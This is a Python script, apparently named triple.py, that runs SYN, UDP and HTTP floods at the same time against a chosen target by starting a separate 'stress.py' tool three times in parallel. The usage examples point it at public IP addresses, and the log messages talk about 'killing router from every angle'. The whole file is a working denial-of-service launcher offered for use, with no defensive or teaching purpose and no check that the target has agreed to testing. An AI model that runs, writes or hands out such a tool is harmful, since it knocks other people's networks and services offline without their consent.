#!/usr/bin/env python3
"""triple — syn + udp + http at once against any target."""

import sys, os, subprocess, time, signal
from datetime import datetime

BANNER = """
  triple — syn + udp + http simultaneously
"""

STRESS = os.path.expanduser("~/pentools/stress.py")
procs = []


def log(msg):
    print(f"  [{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def handler(sig, frame):
    log("stopping...")
    for p in procs:
        if p.poll() is None:
            p.terminate()
    for p in procs:
        try:
            p.wait(timeout=3)
        except:
            p.kill()
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, handler)
    print(BANNER)

    if len(sys.argv) < 2:
        print("  usage: python3 triple.py <target> [duration] [flags]")
        print("  examples:")
        print("    sudo python3 triple.py 192.168.0.1 60")
        print("    sudo python3 triple.py 2.121.59.67 30")
        print("    python3 triple.py example.com 20")
        print("    sudo python3 triple.py 217.45.28.154 120 --monitor")
        sys.exit(0)

    target = sys.argv[1]
    dur = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else 30
    flags = " ".join(sys.argv[3:]) if len(sys.argv) > 3 else ""

    log(f"target:   {target}")
    log(f"duration: {dur}s")
    log(f"methods:  syn + udp + http")
    log(f"total:    ~3x the single-method firepower")
    log("")

    cmds = [
        ["sudo", "python3", "-u", STRESS, target, "syn", str(dur)]
        + (flags.split() if flags else []),
        ["sudo", "python3", "-u", STRESS, target, "udp", str(dur)]
        + (flags.split() if flags else []),
        ["sudo", "python3", "-u", STRESS, target, "http", str(dur)]
        + (flags.split() if flags else []),
    ]

    for cmd in cmds:
        p = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        procs.append(p)

    log("all 3 launched — killing router from every angle")
    log("")

    # Stream output from all
    while any(p.poll() is None for p in procs):
        for p in procs:
            if p.poll() is not None:
                continue
            try:
                line = p.stdout.readline()
                if line:
                    line = line.strip()
                    if line:
                        prefix = ["syn", "udp", "http"][procs.index(p)]
                        print(f"  [{prefix}] {line}", flush=True)
            except:
                pass
        time.sleep(0.1)

    for p in procs:
        try:
            p.wait(timeout=2)
        except:
            p.kill()

    log("all attacks finished")
